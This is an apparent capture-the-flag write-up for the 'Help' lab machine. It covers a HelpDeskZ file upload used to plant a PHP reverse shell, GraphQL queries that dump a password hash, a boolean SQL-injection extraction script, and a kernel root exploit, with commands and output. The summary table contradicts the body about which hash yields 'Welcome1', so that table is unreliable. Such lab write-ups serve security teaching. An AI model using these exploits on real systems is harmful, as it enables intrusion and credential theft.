# Help
```
Difficulty: Easy
Operating System: Linux
Hints: True
```

### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
|:---|:---|:---|:---|
| 1 | (Local) | Web Service Enumeration | Found Apache on port 80 with a default page, and a Node.js Express framework on port 3000. Further enumeration of port 80 revealed a `/support` directory running HelpDeskZ version 1.0.2. |
| 2 | `help` (Method 1) | HelpDeskZ Arbitrary File Upload (CVE-2015-6677) | Exploited an arbitrary file upload vulnerability in HelpDeskZ 1.0.2 by uploading a PHP reverse shell. Recreated the file name hash using the server's epoch time (obtained from HTTP headers), and then accessed the file to trigger the reverse shell, gaining a shell as the `help` user. |
| 3 | `help` (Method 2) | GraphQL Enumeration & SQL Injection | Enumerated the GraphQL endpoint on port 3000 to discover `user` and `password` fields. The returned MD5 hash for the `help` user was cracked to reveal the password `Welcome1`. Used this password to log in via SSH as the `help` user. |
| 4 | `root` | Kernel Exploit (Privilege Escalation) | Discovered a vulnerable Linux kernel version (4.4.0-116-generic) running on the target. Used a known kernel exploit (CVE-2017-1000253) to escalate privileges from the `help` user to `root`. |


## Initial Enumeration
Running nmap scan (TCP) on the target shows the following
```
Nmap scan report for help.htb (10.10.10.121)
Host is up (0.042s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
|_  256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
As we can see the operating system is ubuntu and we can check the exact release on lunchpad if we want.  
As we can quickly see, this should be ubuntu xenial.  
Now let's start digging into port 80.  
As we hit the webserver, we can see the apache default page.  
Since there is nothing here so far, let's run gobuster and see if there is anything else here.  
```
/support              (Status: 301) [Size: 314] [--> http://10.10.10.121/support/]
/javascript           (Status: 301) [Size: 317] [--> http://10.10.10.121/javascript/]
/server-status        (Status: 403) [Size: 300]
```
Now, let's open the /support url.  
Here we are prompted of an 'helpdeskz' site, now let's try to enumerate the version.  
Since there is nothing in the source code/copyright/images that gives us an hint on the version, let's navigate to [helpdeskz GitHub Repo](https://github.com/evolutionscript/HelpDeskZ-1.0) and see if there is something that can help us in enumerating version.  
As we can notice, there is a README.md file that is disclosing the version.  
Now we can try to check whether the same file is available on the live application.  
```
[root@kali Help ]$ curl http://$TARGET/support/README.md
![](/images/logo.png)

Version: 1.0.2 from 1st June 2015<br>
Developed by: Evolution Script S.A.C.<br>
[Help Desk Software HelpDeskZ](http://www.helpdeskz.com)
```
So, now we have the version: 1.0.2  
With the discovered information, let's search for publicly available exploits.  
```
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
HelpDeskZ 1.0.2 - Arbitrary File Upload                                                                                                                                                                    | php/webapps/40300.py
HelpDeskZ < 1.0.2 - (Authenticated) SQL Injection / Unauthorized File Download                                                                                                                             | php/webapps/41200.py
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

## User
### Method 1 - Arbitrary File Upload php/webapps/40300.py
Here we just need to follow the author steps to upload a shell.  
We can craft our payload with a php reverse shell, for doing so, we can use the following file:
```
/usr/share/laudanum/php/php-reverse-shell.php
```
and edit the ip address and port properly.  
now we can upload new ticket, fill all the required information and as an attachment we can provide the php shell.  
Once the file is uploaded we can see an error message 'File Not Allowed', but in the back-end, the file gets uploaded anyway.  
This is probably due to the fact that the developer thought that since the file gets renamed with the below vuncion, there will be no harm in uploading php files.
```
$filename = md5($_FILES['attachment']['name'].time())...$ext;
```
To take advantage of this, the exploit simply uses the same hash function to recreate the digest.  
The only problem here is that we need to get the exact server time/format.  
Retrive the format is simple, we can just run the same function on php.
```
[root@kali Help ]$ php -a                                                                                                           
Interactive mode enabled
php > echo(time());
1641899554
```
As we can see the format is epoch time.
The Unix epoch (or Unix time or POSIX time or Unix timestamp) is the number of seconds that have elapsed since January 1, 1970 (midnight UTC/GMT), not counting leap seconds.
Now we need to get the server time. To gather such information, we can use the 'date' header in the http response.  
Once we have all this information, we can recreate the digest.  
Since the upload time is obviously minor than the current time, we can execute a for loop that tries to bruteforce the correct upload time.
```
for x in range(0, 3000):
    plaintext = fileName + str(currentTime - x)
```
Now that we have a clear vision of how the exploit works we can run it.  
```
python 40300.py http://help.htb/support/uploads/tickets/ php-reverse-shell.php
```
the 'uploads/' folder can be guessed by simply looking at the directory structure in the [helpdeskz GitHub Repo](https://github.com/evolutionscript/HelpDeskZ-1.0).
```
root@kali:~/Documents/HTB/Boxes/Help# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.121] 35756
Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 03:24:25 up 1 day, 13:41,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
help     pts/0    10.10.14.9       01:45    1:23m  0.02s  0.02s -bash
uid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare)
/bin/sh: 0: can't access tty; job control turned off
$
```
when the the file gets hitted (found) we get the reverse shell as user help.

### Method 2 - Inferential SQL Injection php/webapps/41200.py
To take advantage of this vulnerability, we'll need to find credentials for access helpdeskz, so, let's start digging into port 3000.  
as we open the site, we can see the following message:
```
Hi Shiv, To get access please find the credentials with given query
```
since we know that this is nodeJS from the initial nmap enumeration, we can search on google a string like:  
```
express language query node
```
And as we can see, lots of graphql links pop up.  
Now that we know that this is graphql, we can try to search some resources that guide us in querying the service.  
Without searching too much wi can find thi guide [here](https://book.hacktricks.xyz/pentesting/pentesting-web/graphql). So let's dig into the service.
First thing, as always, we need to enumerate the schema with:
```
http://help.htb:3000/graphql?query={__schema{types{name,fields{name,%20args{name,description,type{name,%20kind,%20ofType{name,%20kind}}}}}}}
```
once we have the schema, we can query for username and password attributes:
```
http://help.htb:3000/graphql?query={user{username,password}}
```
And we do get the following response:
```
{"data":{"user":{"username":"helpme@helpme.com","password":"5d3c93182bb20f07b994a7f617e99cff"}}}
```
since the given hash is 32 characters:
```
[root@kali exploits ]$ echo "5d3c93182bb20f07b994a7f617e99cff" |wc -c
33
```
we can assume this is md5, so we can search for the digest on google and see if there is any calculation for that.  
Without too much effort, we can see open the first result and see [here](https://md5hashing.net/hash/md5/5d3c93182bb20f07b994a7f617e99cff) and see that the password is 'godhelpmeplz'.
Now with the given password, we can proceed with php/webapps/41200.py exploit.
As we can read in the author's exploit, there is an 'inferential' SQL injection vulnerability on helpdeskz 1.0.2.  
The term 'Inferential' means that we can enumerate the database only by having boolean-based responses.  
as we can read in the exploit we can just download a ticket attachment and add a boolean based query in the param array. If the server responds with a 404 page, it means that the query has been evaluated as false, otherwise, it means that the query has been evaluated as true.  
we can test it by sending the following query, appending 'and 1=1':
```
GET /support/?v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6+and+1%3d1-- HTTP/1.1
Host: help.htb
[... SNIP ...]
```
as we can see as a response we get the uploaded file:
```
HTTP/1.1 200 OK
[... SNIP ...]
Content-Type: text/plain;charset=UTF-8

google for: express language query node
[... SNIP ...]
```
Instead, if we set 'and 1=2' we do get the following response:
```
HTTP/1.1 200 OK
Date: Mon, 10 Jan 2022 09:43:41 GMT
Server: Apache/2.4.18 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 1102
Connection: close
Content-Type: text/html; charset=UTF-8

[... SNIP ...]
<title>Page not found - 404</title>
```
So, as always, let's start by enumerating the schema with sqlmap, so that then we can query the database using this vulnerability, poking for credentials:
```
[root@kali exploits ]$ sqlmap -r req.txt --batch --schema
[... SNIP ...]
[11:48:21] [INFO] fetching columns for table 'staff' in database 'support'
[11:48:21] [INFO] retrieved: 14
[11:48:21] [INFO] retrieved: id
[11:48:22] [INFO] retrieved: int(11)
[11:48:25] [INFO] retrieved: username
[11:48:28] [INFO] retrieved: varchar(255)
[11:48:32] [INFO] retrieved: password
[11:48:35] [INFO] retrieved: varchar(255)
[11:48:39] [INFO] retrieved: fullname
```
now that we've found 'users' table let's try to exfiltrate the password hash.  
For doing so, we can use the following script:  
```
import requests

def sql_infer_inject(query):
    url=f'http://10.10.10.121/support/?v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6 and {query}'
    cookies = { 'PHPSESSID':'8cq82cchnlqba71q2tis5pmj93' }
    response = requests.get(url, cookies=cookies)
    if response.headers['Content-Type'] == 'text/plain;charset=UTF-8':
        return True
    else:
        return False


# The LIMIT clause can be used to constrain the number of rows returned by the SELECT statement.
# LIMIT takes one or two numeric arguments, which must both be nonnegative integer constants (except when using prepared statements).
# With two arguments:
# - first argument specifies the offset of the first row to return (0=first row of the table)
# - the second specifies the maximum number of rows to return.
# The offset of the initial row is 0 (not 1).

# The SUBSTRING() function extracts some characters from a string.
# SUBSTRING(string, start, length)
# - string    Required. The string to extract from
# - start   Required. The start position. The first position in string is 1
# - length  Required. The number of characters to extract. Must be a positive number

keyspace='abcdef0123456789'
for i in range(45):
    for c in keyspace:
        query=f"substr((select password from staff limit 0,1),{i},1)='{c}'"
        if sql_infer_inject(query):
            print(c, end='',flush=True)
```
we have a ```sql_infer_inject``` function that returns true if the query is evaluated as tru, else returne false.  
now we buld a keyspace (for SHA1) and try to enumerate the hash by evaluating the boolean expression character by character.  
```
[root@kali Help ]$ python3 sql.py                                                                
d318f44739dced66793b1a603028133a76ae680e
```
as we can see, now we have the hash, we can go to [crackstation.net](https://crackstation.net/) paste it, and as result we do get: 'Welcome1'  
Now we can use the discovered password to login via ssh.  
```
[root@kali ~ ]$ ssh -l help $TARGET   
help@10.10.10.121's password:
Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 4.4.0-116-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
You have new mail.
Last login: Fri Jan 11 06:18:50 2019
help@help:~$
```

## Root
Now that we have shell access, we can start enumerate the box with linpeas.sh.  
Instantly we can see that the kernel is old:  
```
════════════════════════════════════╣ Basic information ╠════════════════════════════════════
OS: Linux version 4.4.0-116-generic (buildd@lgw01-amd64-021) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.9) ) #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018
```
If we google around for '4.4.0-116-generic kernel privilege escalation', as a first result we can find [this](https://www.exploit-db.com/exploits/44298).  
now we can try to upload the source and compile the code:  
```
help@help:/dev/shm$ gcc exploit.c -o exploit
help@help:/dev/shm$ ./exploit
task_struct = ffff88003693d400
uidptr = ffff88003acc6b44
spawning root shell
root@help:/dev/shm# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare),1000(help)
root@help:/dev/shm#
```
and we got root.
